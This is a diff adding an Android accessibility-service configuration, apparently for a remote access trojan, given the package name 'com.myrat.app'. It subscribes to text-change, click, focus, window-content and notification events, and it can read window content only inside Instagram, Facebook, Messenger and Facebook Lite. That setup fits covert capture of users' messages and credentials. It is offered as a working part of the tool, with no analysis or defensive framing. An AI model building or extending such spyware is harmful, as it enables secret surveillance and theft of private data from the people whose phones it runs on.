@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeWindowContentChanged|typeViewTextChanged|typeWindowStateChanged|typeNotificationStateChanged|typeViewClicked|typeViewFocused"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"
+    android:packageNames="com.instagram.android,com.facebook.katana,com.facebook.orca,com.facebook.lite"
+    android:canRetrieveWindowContent="true"
+    android:notificationTimeout="50"
+    android:settingsActivity="com.myrat.app.MainActivity"
+    android:description="@string/social_media_accessibility_description"/>
